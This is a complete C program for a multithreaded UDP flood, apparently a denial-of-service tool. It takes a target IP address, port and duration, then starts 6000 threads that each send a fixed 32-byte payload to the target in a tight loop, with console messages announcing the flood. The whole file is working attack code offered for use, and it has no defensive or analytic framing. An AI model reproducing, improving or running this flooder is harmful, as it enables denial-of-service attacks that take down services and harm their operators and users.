#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREADS 6000

// Define your payload here
#define PAYLOAD "\x61\x7B\x53\xFD\xDD\xBE\xDE\x9F\x09\xD8\x55\x86\x46\xD1\xD4\xD8\xC1\x94\x7A\xE5\x26\x27\x0C\x8A\x35\x36\x9B\x4F\x84\xDF\x7F\xC0"
#define PAYLOAD_SIZE 32

char target_ip[64];
int target_port;
int duration;

void *flood(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    addr.sin_addr.s_addr = inet_addr(target_ip);

    time_t end_time = time(NULL) + duration;

    while (time(NULL) < end_time) {
        sendto(sock, PAYLOAD, PAYLOAD_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr));
    }

    close(sock);
    pthread_exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <TIME>\n", argv[0]);
        return 1;
    }

    strncpy(target_ip, argv[1], sizeof(target_ip));
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);

    pthread_t threads[THREADS];

    printf("[*] Flooding %s:%d with %d threads for %d seconds...\n", target_ip, target_port, THREADS, duration);

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, flood, NULL);
        usleep(1000); // Minor delay
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[+] Done.\n");
    return 0;
}
